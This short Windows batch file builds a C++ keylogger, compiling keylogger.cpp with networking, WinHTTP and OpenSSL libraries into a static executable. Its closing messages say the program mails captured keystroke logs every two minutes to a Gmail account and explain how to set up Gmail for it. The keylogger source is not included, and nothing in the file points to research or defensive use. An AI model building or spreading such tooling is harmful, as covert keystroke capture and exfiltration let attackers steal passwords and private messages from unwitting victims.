@echo off
REM Build script for C++ Keylogger
REM Requires: MinGW-w64 with OpenSSL support

echo Building C++ Keylogger...

REM Check if g++ is available
where g++ >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: g++ not found. Please install MinGW-w64.
    exit /b 1
)

REM Compile with OpenSSL support
g++ -o keylogger.exe keylogger.cpp ^
    -lws2_32 ^
    -lwinhttp ^
    -lcrypt32 ^
    -lssl ^
    -lcrypto ^
    -static ^
    -O2 ^
    -w

if %errorlevel% equ 0 (
    echo Build successful! Output: keylogger.exe
) else (
    echo Build failed!
    exit /b 1
)

echo.
echo NOTE: For Gmail, you need to enable "Less secure app access" 
echo or use an App Password if you have 2FA enabled.
echo.
echo The program sends logs every 2 minutes to your Gmail account.
echo.
pause
